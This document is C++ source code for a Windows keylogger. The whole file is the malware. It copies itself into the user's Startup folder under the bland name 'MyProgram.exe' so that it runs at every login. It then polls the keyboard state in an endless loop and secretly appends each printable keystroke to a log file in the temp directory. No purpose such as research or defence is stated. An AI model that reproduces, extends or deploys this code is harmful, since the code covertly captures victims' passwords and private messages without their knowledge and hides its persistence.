#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <Windows.h>
#include <shlobj.h>

void CopyToStartup(const char* sourcePath, const char* destinationPath) {
    CopyFileA(sourcePath, destinationPath, FALSE);
}

bool IsPrintableKey(int key) {
    return (key >= 32 && key <= 126);
}

int main() {
    char tempPath[MAX_PATH];
    DWORD result = GetTempPathA(MAX_PATH, tempPath);
    if (result == 0 || result > MAX_PATH) {
        return 1;
    }

    // Concatenate the log file name to the temporary directory path
    char logFilePath[MAX_PATH];
    strcpy_s(logFilePath, tempPath);
    strcat_s(logFilePath, "\\key_log.txt"); // Log file name

    // Concatenate the executable path to the temporary directory path
    char exeFilePath[MAX_PATH];
    GetModuleFileNameA(NULL, exeFilePath, MAX_PATH);

    // Determine startup folder
    char startupFolderPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath);

    // Create the destination path for the copy
    char destinationPath[MAX_PATH];
    strcpy_s(destinationPath, startupFolderPath);
    strcat_s(destinationPath, "\\");
    strcat_s(destinationPath, "MyProgram.exe");

    // Copy this program to startup
    CopyToStartup(exeFilePath, destinationPath);

    bool keyStates[256] = { false }; // To track key states

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000 && !keyStates[key]) {
                keyStates[key] = true;
                if (IsPrintableKey(key)) {
                    char keyChar = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
                    std::ofstream logFile;
                    logFile.open(logFilePath, std::ios::app); // Open the file in append mode
                    if (logFile.is_open()) {
                        logFile << ": " << keyChar << std::endl;
                        logFile.close();
                    }
                }
            }
            else if (!(GetAsyncKeyState(key) & 0x8000)) {
                keyStates[key] = false;
            }
        }
        Sleep(10); // Sleep to reduce CPU usage
    } // End of while loop

    return 0;
}